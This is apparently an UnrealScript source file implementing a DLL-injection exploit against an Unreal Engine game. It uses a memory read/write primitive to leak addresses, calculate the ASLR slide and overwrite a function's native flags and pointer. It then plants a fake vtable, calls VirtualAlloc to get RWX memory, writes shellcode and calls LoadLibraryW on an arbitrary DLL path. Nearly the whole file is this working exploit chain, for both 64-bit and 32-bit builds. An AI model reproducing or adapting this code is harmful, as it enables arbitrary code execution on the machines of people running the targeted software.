class Api extends Object dependsOn(
    RawPayloads,
    DataStructures,
    CorruptedObject,
    ReadWritePrimitive
); 

// optional stub functions that can be overriden by medic.dll 
//  to allow debugging, logic sanity checking
static final function bool MedicDll_IsActive() {
    return False;
}

static final function MedicDll_HookGMalloc() {
    `log("error: calling stub function");
}

static final function ForceExit() {
    local int I;
    // the unreal vm cannot abide big ass for-loops
    for(I = 0; I < 0x10000000; I++) {}
}

static final function Panic(const string Msg) {
    `log("PANIC: " $ Msg);
    ForceExit();
}

static final function string GetInjectedDllPath() {
    return `PAYLOAD.InjectedDllPath;
}

static final function bool InjectDLL(const string DllPath) {
    local bool InjectionResult;
    local string DllPath_Normalised;
    // ensure that DllPath ends with null terminator 
    DllPath_Normalised = DllPath $ Chr(0x0) $ Chr(0x0);
    `log("try and run " $ DllPath_Normalised);
`if(`isdefined(Arch_x86_64))
    InjectionResult = Run64(DllPath_Normalised);
`else
    InjectionResult = Run32(DllPath_Normalised);
`endif
    
`if(`isdefined(onlyTestDLLInjection))
    `log("--early exit--");
    ForceExit();
`endif

    return InjectionResult;
}

`if(`isdefined(Arch_x86_64))

static final function bool Run64(out string DllPath) {
    local int I, tmpInt;
    
    local Address arg0, arg1, arg2;

    local ReadWritePrimitive Prim;
    
    local array<int> FakeVtable;
    local Address Ptr_FakeVtable_Data;

    local Address Ptr_DllPath_Data;

    local CorruptedObject CorruptTgt;
    local Address Ptr_CorruptTgt;
    local Address Ptr_CorruptTgt_Vtable;
    local int Offset_CorruptTgt_Properties;    

    local Address Ptr_ConfusedNativeFunc;

    local Address Ptr_CorruptTgt_UClass;
    local Address Ptr_CorruptTgt_UClass_FuncMap_Data;
    local int UClass_FuncMap_Data_Len;

    local UnpackedName FuncOverrideTarget_Name;
    local Address Ptr_FuncOverrideTarget_UFunction;
    
    local Address ASLR_Slide;

    local Address vft__UObject; 
    local Address Ptr_PLT_LoadLibraryW, Ptr_LoadLibraryW;

    local Address Ptr_VirtualAlloc; 

    local int SavedLowFlags, SavedHighFlags;
    local Address SavedFunc;

    `log("[i] Run64");

`if(`isdefined(Flavour_udk64))
    `log("err: udk64 DLL injection not yet supported - needs implemented symbol finder");
    return False;
`endif

    // make sure FakeVtable + DllPath has allocated ~0x800 bytes each
    //  to prevent TArray<...>.Data realloc making .Data pointers stale
    FakeVtable.Insert(0x0, 0x800 / 0x4);

    Prim = new Class'ReadWritePrimitive';
    if(Prim.Init() != True) {
        return False;
    }

    vft__UObject = `PAYLOAD.Ptr_Vft_UObject;
    Ptr_PLT_LoadLibraryW = `PAYLOAD.Ptr_Plt_LoadLibraryW;

    CorruptTgt = new Class'CorruptedObject';

    Ptr_CorruptTgt = Prim.LeakObjectAddress(CorruptTgt);
    `log("[i] Ptr_CorruptTgt: " $ `UTIL.FormatAddr(Ptr_CorruptTgt));
    // figure out where CorruptTgt stores properties
    Offset_CorruptTgt_Properties = 0x77777777;
    for(I = 0x0; I < 0x180; I += 0x8) {
        if(Prim.ReadI32(Ptr_CorruptTgt, I) == 0x3333beef 
            && Prim.ReadI32(Ptr_CorruptTgt, I + 0x4) == 0x2222dead) {
            Offset_CorruptTgt_Properties = I;
            `log("[i] Offset_CorruptTgt_Properties: " $ ToHex(Offset_CorruptTgt_Properties));
        }
    }

    if(Offset_CorruptTgt_Properties == 0x77777777) {
        `log("[fail] failed to determineOffset_CorruptTgt_Properties");
        ForceExit();    
    }

    Ptr_CorruptTgt_UClass = Prim.LeakObjectAddress(CorruptTgt.Class);
    `log("[i] Ptr_CorruptTgt_UClass: " $ `UTIL.FormatAddr(Ptr_CorruptTgt_UClass));

    `log("[x] Begin DLL injection");
    // read vtable for Prim (vft__UObject)
    Ptr_CorruptTgt_Vtable = Prim.ReadAddress(Ptr_CorruptTgt, 0x0);
    `log("[i] Ptr_CorruptTgt_Vtable (vft__UObject) = " $ `UTIL.FormatAddr(Ptr_CorruptTgt_Vtable));

    ASLR_Slide = `UTIL.Address_SubAddr(Ptr_CorruptTgt_Vtable, vft__UObject);
    `log("[i] ASLR_Slide (vft__UObject) = " $ `UTIL.FormatAddr(ASLR_Slide));

    Ptr_PLT_LoadLibraryW = `UTIL.Address_AddAddr(Ptr_PLT_LoadLibraryW, ASLR_Slide);
    `log("[i] Ptr_PLT_LoadLibraryW = " $ `UTIL.FormatAddr(Ptr_PLT_LoadLibraryW));
    
    Ptr_LoadLibraryW = Prim.ReadAddress(Ptr_PLT_LoadLibraryW, 0x0);
    `log("[i] Ptr_LoadLibraryW = " $ `UTIL.FormatAddr(Ptr_LoadLibraryW));

    Ptr_DllPath_Data.Low = Prim.LeakFString(DllPath).DataLow;
    Ptr_DllPath_Data.High = Prim.LeakFString(DllPath).DataHigh;
    `log("[i] Ptr_DllPath_Data: " $ `UTIL.FormatAddr(Ptr_DllPath_Data));

    Ptr_FakeVtable_Data.Low = Prim.LeakIntArray(FakeVtable).DataLow;
    Ptr_FakeVtable_Data.High = Prim.LeakIntArray(FakeVtable).DataHigh;
    `log("[i] Ptr_FakeVtable_Data: " $ `UTIL.FormatAddr(Ptr_FakeVtable_Data));

    // FuncMap = TMap<FName, UFunction*>
    Ptr_CorruptTgt_UClass_FuncMap_Data = Prim.ReadAddress(Ptr_CorruptTgt_UClass, `PAYLOAD.off_UFunction_FuncMap_Data);
    UClass_FuncMap_Data_Len = Prim.ReadI32(Ptr_CorruptTgt_UClass, `PAYLOAD.off_UFUnction_FuncMap_Length);
    `log("[i] Ptr_CorruptTgt_UClass_FuncMap_Data = " $ `UTIL.FormatAddr(Ptr_CorruptTgt_UClass_FuncMap_Data) $ ", len = " $ UClass_FuncMap_Data_Len);
    
    FuncOverrideTarget_Name = Prim.LeakName('FuncOverrideTarget');
    `log("[i] FuncOverrideTarget_Name{.index = 0x" $ ToHex(FuncOverrideTarget_Name.Index) $ ", .suffix = 0x" $ ToHex(FuncOverrideTarget_Name.Suffix) $ "}");
        
    `log("[x] identify CorruptedObject.FuncOverrideTarget");
    // we want to find sparse entry for CorruptedObject.FuncOverrideTarget
    //  so we can then the paired UFunction*
    for(i = 0; i < UClass_FuncMap_Data_Len; i++) {
        // what makes up a sparse entry?
        // 0x0: FName.Index
        // 0x4: Fname.Suffix
        // 0x8: UFunction *
        // 0xC: SparseEntry.next (can be -1/0xFFFFFFFF)
        // why i * 20? sparse entries are aligned to 20/0x14 bytes (i think?)
        if(Prim.ReadI32(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 0x18) + 0x0) == FuncOverrideTarget_Name.Index &&
            Prim.ReadI32(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 0x18) + 0x4) == FuncOverrideTarget_Name.Suffix) {
            `log("[i] found FuncMap entry for 'FuncOverrideTarget' at idx " $ i);
            Ptr_FuncOverrideTarget_UFunction = Prim.ReadAddress(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 0x18) + 0x8);
            break;
        }
    }

    `log("[i] Ptr_FuncOverrideTarget_UFunction = " $ `UTIL.FormatAddr(Ptr_FuncOverrideTarget_UFunction));
    `log("[x] confusing FuncOverrideTarget into thinking it's 'Native'");
    // set Native flag where appropriate in UFunction
    SavedLowFlags = Prim.ReadI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags);
    TmpInt = SavedLowFlags | 0x400;
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags, TmpInt);

    SavedHighFlags = Prim.ReadI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags);
    TmpInt = SavedHighFlags | 0x4000;
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags, TmpInt);

    // set UFunction.Func = UMaterialInstance::execSetFontParameterValue
    Ptr_ConfusedNativeFunc = `PAYLOAD.Ptr_UMaterialInstance_execSetFontParameterValue;
    Ptr_ConfusedNativeFunc = `UTIL.Address_AddAddr(Ptr_ConfusedNativeFunc, ASLR_Slide);
    `log("[i] UOnlineProfileSettings::execGetProfileSettingDefaultId: " $ `UTIL.FormatAddr(Ptr_ConfusedNativeFunc));

    SavedFunc = Prim.ReadAddress(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_Func);

    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_Func, Ptr_ConfusedNativeFunc.Low);
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_Func + 0x4, Ptr_ConfusedNativeFunc.High);
    
    for(I = 0; I < 0x600; I += 0x4) {
        FakeVtable[I / 0x4] = Prim.ReadI32(Ptr_CorruptTgt_Vtable, I);
    }

    Ptr_VirtualAlloc = Prim.ReadAddress(`UTIL.Address_AddAddr(`PAYLOAD.Ptr_Plt_VirtualAlloc, ASLR_Slide), 0x0);
    `log("[i] Ptr_VirtualAlloc = " $ `UTIL.FormatAddr(Ptr_VirtualAlloc));

    for(I = 0x340; I < 0x470; I += 0x8) {
         FakeVtable[I / 0x4] = Ptr_VirtualAlloc.Low;
         FakeVtable[(I + 0x4) / 0x4] = Ptr_VirtualAlloc.High;
    }

    `log("[x] call FuncOverrideTarget -> VirtualAlloc(&CorruptTgt, 0x2000, 0x2000, 0x40)");

    Prim.WriteI32(Ptr_CorruptTgt, 0x0, Ptr_FakeVtable_Data.Low);
    Prim.WriteI32(Ptr_CorruptTgt, 0x4, Ptr_FakeVtable_Data.High);

    CorruptTgt.FuncOverrideTarget(0x1000, 0x1000, 0x40);
    `log("[i] VirtualAlloc call successful");

    `log("[x] Check &CorruptTgt has RWX permissions");
    `log("[x] Copy + Run CheckRWX asm");
    for(I = 0; I < ArrayCount(`PAYLOAD.CheckRWX); I++) {
        // `log("[x] asm " $ ToHex(`PAYLOAD.CheckRWX[I]) $ " -> " $ ToHex(Offset_CorruptTgt_Properties + (I * 0x4)));
        Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + (I * 0x4), `PAYLOAD.CheckRWX[I]);
    }

    // account for probable vftentry[x] used by execSetFontParameterValue
    for(I = 0x340; I < 0x470; I += 0x8) {
        FakeVtable[I / 0x4] = `UTIL.Address_AddI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0x18).Low;
        FakeVtable[(I + 0x4) / 0x4] = `UTIL.Address_AddI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0x18).High;
    }

    CorruptTgt.FuncOverrideTarget(0x0, 0x0, 0x0);

    `log("CheckRWX - " $ ToHex(Prim.ReadI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties)));

    `log("[x] Copy + Run SimpleCallFuncPtr asm");
    for(I = 0; I < ArrayCount(`PAYLOAD.SimpleCallFuncPtr); I++) {
        // `log("[x] asm " $ ToHex(`PAYLOAD.SimpleCallFuncPtr[I]) $ " -> " $ ToHex(Offset_CorruptTgt_Properties + (I * 0x4)));
        Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + (I * 0x4), `PAYLOAD.SimpleCallFuncPtr[I]);
    }

    Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0x0, Ptr_LoadLibraryW.Low);
    Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0x4, Ptr_LoadLibraryW.High);

    Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0x8, Ptr_DllPath_Data.Low);
    Prim.WriteI32(Ptr_CorruptTgt, Offset_CorruptTgt_Properties + 0xC, Ptr_DllPath_Data.High);   

    `log("[i] > LoadLibraryW");
    CorruptTgt.FuncOverrideTarget(0x0, 0x0, 0x0);
    `log("[i] < LoadLibraryW");

    // restoring fields
    Prim.WriteAddress(Ptr_CorruptTgt, 0x0, Ptr_CorruptTgt_Vtable);
    Prim.WriteAddress(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_Func, SavedFunc);
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags, SavedHighFlags);
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags, SavedLowFlags);

    return True;
}

// :: 32bit specific
`else 

static final function bool Run32(out string DllPath) {
    local ReadWritePrimitive Prim;

    local array<int> FakeVtable;
    local Address Ptr_FakeVtable_Data;

    local Address Ptr_DllPath_Data;

    local CorruptedObject CorruptTgt;
    local Address Ptr_CorruptTgt;
    local Address Ptr_CorruptTgt_Vtable;

    local Address Ptr_CorruptTgt_UClass;
    local int UClass_FuncMap_Data_Len;
    local Address Ptr_CorruptTgt_UClass_FuncMap_Data;

    local UnpackedName FuncOverrideTarget_Name;
    local Address Ptr_FuncOverrideTarget_UFunction;

    local int I;
    local int TmpInt;
    local int SavedFlagsLow, SavedFlagsHigh;
    local Address Ptr_LoadLibraryW;

    local Address ASLR_Slide;

    `log("[i] Run32");

    Prim = new Class'ReadWritePrimitive';
    if(Prim.Init() != True) {
        return False;
    }

    // if(MedicDll_IsActive()) {
    //     MedicDll_HookGMalloc();
    // } 

    CorruptTgt = new Class'CorruptedObject';

    Ptr_CorruptTgt = Prim.LeakObjectAddress(CorruptTgt);
    `log("[i] Ptr_CorruptTgt: " $ `UTIL.FormatAddr(Ptr_CorruptTgt));
    Ptr_CorruptTgt_UClass = Prim.LeakObjectAddress(CorruptTgt.Class);
    `log("[i] Ptr_CorruptTgt_UClass: " $ `UTIL.FormatAddr(Ptr_CorruptTgt_UClass));

    // make sure FakeVtable has allocated ~0x800
    //  to prevent TArray<...>.Data realloc making .Data pointer stale
    FakeVtable.Insert(0x0, 0x800 / 0x4);

    Ptr_FakeVtable_Data.Low = Prim.LeakIntArray(FakeVtable).Data;
    `log("[i] Ptr_FakeVtable_Data: " $ `UTIL.FormatAddr(Ptr_FakeVtable_Data));

    Ptr_DllPath_Data.Low = Prim.LeakFString(DllPath).Data;
    `log("[i] Ptr_DllPath_Data: " $ `UTIL.FormatAddr(Ptr_DllPath_Data));

    // read vtable for Prim (vft__UObject)
    Ptr_CorruptTgt_Vtable = Prim.ReadAddress(Ptr_CorruptTgt, 0x0);
    `log("[i] Ptr_CorruptTgt_Vtable = " $ `UTIL.FormatAddr(Ptr_CorruptTgt_Vtable));
    
    ASLR_Slide = `UTIL.Address_SubAddr(Ptr_CorruptTgt_Vtable, `PAYLOAD.Ptr_Vft_UObject);
    `log("[i] ASLR_Slide = " $ `UTIL.FormatAddr(ASLR_Slide) $ " (using vft__UObject " $ `UTIL.FormatAddr(`PAYLOAD.Ptr_Vft_UObject) $ ")");

    // FuncMap = TMap<FName, UFunction*>
    Ptr_CorruptTgt_UClass_FuncMap_Data = Prim.ReadAddress(Ptr_CorruptTgt_UClass, `PAYLOAD.off_UFunction_FuncMap_Data);
    UClass_FuncMap_Data_Len = Prim.ReadI32(Ptr_CorruptTgt_UClass, `PAYLOAD.off_UFUnction_FuncMap_Length);

    if(UClass_FuncMap_Data_Len < 0 || UClass_FuncMap_Data_Len > 0x300) {
        `log("err: UClass_FuncMap_Data_Len looks incorrect, got " $ ToHex(UClass_FuncMap_Data_Len) $ "?");
        return False;
    }

    `log("[i] Ptr_CorruptTgt_UClass_FuncMap_Data = " $ `UTIL.FormatAddr(Ptr_CorruptTgt_UClass_FuncMap_Data) $ ", len = " $ UClass_FuncMap_Data_Len);
    
    FuncOverrideTarget_Name = Prim.LeakName('FuncOverrideTarget');
    `log("[i] FuncOverrideTarget_Name{.index = 0x" $ ToHex(FuncOverrideTarget_Name.Index) $ ", .suffix = 0x" $ ToHex(FuncOverrideTarget_Name.Suffix) $ "}");
        
    `log("[x] identify CorruptedObject.FuncOverrideTarget");
    // we want to find sparse entry for CorruptedObject.FuncOverrideTarget
    //  so we can then the paired UFunction*
    for(i = 0; i < UClass_FuncMap_Data_Len; i++) {
        // what makes up a sparse entry?
        // 0x0: FName.Index
        // 0x4: Fname.Suffix
        // 0x8: UFunction *
        // 0xC: SparseEntry.next (can be -1/0xFFFFFFFF)
        // why i * 20? sparse entries are aligned to 20/0x14 bytes (i think?)
        if(Prim.ReadI32(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 20) + 0x0) == FuncOverrideTarget_Name.Index &&
            Prim.ReadI32(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 20) + 0x4) == FuncOverrideTarget_Name.Suffix) {
            `log("[i] identified FuncMap entry for 'FuncOverrideTarget' at idx " $ i);
            Ptr_FuncOverrideTarget_UFunction = Prim.ReadAddress(Ptr_CorruptTgt_UClass_FuncMap_Data, (i * 20) + 0x8);
            break;
        }
    }

    `log("[i] Ptr_FuncOverrideTarget_UFunction = " $ `UTIL.FormatAddr(Ptr_FuncOverrideTarget_UFunction));

    `log("[x] confusing FuncOverrideTarget into thinking it's 'Native'");
    // set Native flag where appropriate in UFunction
    TmpInt = Prim.ReadI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags);
    SavedFlagsLow = TmpInt;
    TmpInt = TmpInt | 0x400;
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags, TmpInt);

    TmpInt = Prim.ReadI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags);
    TmpInt = TmpInt | 0x4000;
    SavedFlagsHigh = TmpInt;
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags, TmpInt);

    // offsetOf(UFunction.Func) = 0xa0
    // target is UMaterialInstanceTimeVarying::execSetDuration
    Prim.WriteAddress(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_Func, `UTIL.Address_AddAddr(`PAYLOAD.Ptr_UMaterialInstanceTimeVarying_execSetDuration, ASLR_Slide));

    // try UFunction, Prim, Prim.Class
    for(i = 0; i < 0x700; i += 0x4) {
        FakeVtable[i / 0x4] = Prim.ReadI32(Ptr_CorruptTgt_Vtable, i);
    }

    `log("[x] set ((UObject *)Prim).__vtable = &FakeVtable.Data (a fake vtable)");
    Prim.WriteI32(Ptr_CorruptTgt, 0x0, Ptr_FakeVtable_Data.Low);

    `log("[x] insert 'LoadLibraryW' as vtable method");
    // extrn LoadLibraryW:dword = .idata:0x213D2D8    
    `log("[x] call LoadLibraryW - .dll should print string");
    Ptr_LoadLibraryW = Prim.ReadAddress(`UTIL.Address_AddAddr(`PAYLOAD.Ptr_Plt_LoadLibraryW, ASLR_Slide), 0x0);
    `log("[i] LoadLibraryW = " $ `UTIL.FormatAddr(Ptr_LoadLibraryW));

    // account for probable vftentry[x] execSetDuration will call
    for(I = 0x200; I < 0x300; i += 0x4) {
        FakeVtable[I / 0x4] = Ptr_LoadLibraryW.Low;
    }
    CorruptTgt.FuncOverrideTarget(Ptr_DllPath_Data.Low);

    // restore state of CorruptTgt before exiting
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_LowFlags, SavedFlagsLow);
    Prim.WriteI32(Ptr_FuncOverrideTarget_UFunction, `PAYLOAD.off_UFunction_HighFlags, SavedFlagsHigh);
    // TODO: maybe restore UFunction - func?
    Prim.WriteAddress(Ptr_CorruptTgt, 0x0, Ptr_CorruptTgt_Vtable);

    return True;
}

`endif
